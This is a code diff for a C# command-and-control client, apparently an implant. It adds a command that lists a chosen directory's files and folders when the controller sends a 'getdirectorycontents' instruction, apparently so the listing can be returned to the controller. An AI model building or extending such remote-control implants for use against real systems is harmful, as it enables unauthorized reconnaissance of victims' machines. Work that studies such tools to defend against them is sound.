@@ -394,6 +394,44 @@ namespace C2Client
             result = sw.ToString();
             return result;
         }
+
+        public string GetDirectoryContents(string dirName)
+        {
+            string result="";
+            StringWriter sw = new StringWriter();
+            string cwd = Directory.GetCurrentDirectory();
+            //dirName = "..";
+            try
+            {
+                var contents = Directory.EnumerateFileSystemEntries(dirName);
+                Console.WriteLine(dirName);
+                //Console.WriteLine(Path.GetFullPath(dirName));
+                sw.WriteLine(Path.GetFullPath(dirName));
+                foreach (var file in contents)
+                {
+                    if (File.Exists(file))
+                    {
+                        //Console.WriteLine(Path.GetFileName(file));
+                        sw.WriteLine("F->" + Path.GetFileName(file));
+                    }
+                    else
+                    {
+                        sw.WriteLine("D->"+ Path.GetFileName(file));
+                    }
+                    
+                }
+                result = sw.ToString();
+            }
+
+            catch(Exception e) 
+            {
+                result = e.Message;
+            }
+            
+            return result;
+        }
+
+
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -599,6 +637,25 @@ namespace C2Client
                         Console.WriteLine(cmd);
                     
                     }
+
+                    else if (cmd.Contains("getdirectorycontents"))
+                    {
+                        // getdirectorycontents-directoryname
+                       string[] content= cmd.Split('-');
+                        string directoryname = content[1];
+
+                        Program p = new Program();
+                        Thread dcontents = new Thread(() =>
+                        {
+                            cmd = p.GetDirectoryContents(directoryname);
+                        });
+                        dcontents.Start();
+                        dcontents.Join();
+
+                        //Thread.Sleep(2000);
+
+                    }
+
                     else
                     {
                         Program p = new Program();
